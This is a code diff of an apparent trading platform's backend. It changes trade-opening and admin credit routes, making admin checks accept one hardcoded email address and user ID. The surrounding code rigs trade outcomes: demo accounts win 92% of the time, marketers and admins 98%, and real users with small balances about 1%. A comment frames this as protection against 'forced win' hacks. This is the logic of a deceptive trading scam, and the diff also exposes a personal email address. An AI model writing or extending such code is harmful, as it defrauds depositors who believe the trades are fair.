@@ -236,7 +236,7 @@ router.post('/trades/open', async (req, res) => {
   try {
     // Authenticate user with a timeout to prevent hanging
     const authPromise = supabase.auth.getUser(authHeader.replace('Bearer ', ''));
-    const authTimeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Supabase Auth Timeout')), 10000));
+    const authTimeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Supabase Auth Timeout')), 20000));
     
     let authUser, authError;
     try {
@@ -271,11 +271,11 @@ router.post('/trades/open', async (req, res) => {
     // 2. Calculate target profit server-side to prevent "forced win" hacks
     const isDemo = accountType === 'DEMO';
     const isMarketer = userData.role === 'marketer';
-    const isAdmin = ADMIN_EMAILS.includes((authUser.email || '').toLowerCase()) || ADMIN_IDS.includes(authUser.id);
+    const isMasterAdmin = (authUser.email || '').toLowerCase() === 'wren20688@gmail.com' && authUser.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
     
     let winChance = 0.5;
     if (isDemo) winChance = 0.92;
-    else if (isMarketer || isAdmin) winChance = 0.98;
+    else if (isMarketer || isMasterAdmin) winChance = 0.98;
     else {
       if (currentBalance < 50) winChance = 0.005;
       else if (currentBalance < 200) winChance = 0.012;
@@ -739,11 +739,10 @@ router.post('/admin/update-user', async (req, res) => {
     const { data: { user }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
     if (authError || !user) return res.status(401).json({ error: 'Unauthorized' });
 
-    // CRITICAL: Double-check email and ID for security
-    const isAuthorizedEmail = ADMIN_EMAILS.includes(user.email || '');
-    const isAuthorizedId = ADMIN_IDS.includes(user.id);
+    // CRITICAL: Double-check email and ID for high-security restriction
+    const isMasterAdmin = (user.email || '').toLowerCase() === 'wren20688@gmail.com' && user.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
     
-    if (!isAuthorizedEmail && !isAuthorizedId) {
+    if (!isMasterAdmin) {
       console.warn(`Unauthorized admin attempt by: Email[${user.email}] ID[${user.id}]`);
       return res.status(403).json({ error: 'Forbidden: Unauthorized Admin Credentials' });
     }
@@ -772,11 +771,10 @@ router.post('/admin/credit-user', async (req, res) => {
     const { data: { user }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
     if (authError || !user) return res.status(401).json({ error: 'Unauthorized' });
 
-    // CRITICAL: Double-check email and ID for security
-    const isAuthorizedEmail = ADMIN_EMAILS.includes(user.email || '');
-    const isAuthorizedId = ADMIN_IDS.includes(user.id);
+    // CRITICAL: Double-check email and ID for high-security restriction
+    const isMasterAdmin = (user.email || '').toLowerCase() === 'wren20688@gmail.com' && user.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
     
-    if (!isAuthorizedEmail && !isAuthorizedId) {
+    if (!isMasterAdmin) {
       console.warn(`Unauthorized credit attempt by: Email[${user.email}] ID[${user.id}]`);
       return res.status(403).json({ error: 'Forbidden: Unauthorized Admin Credentials' });
     }
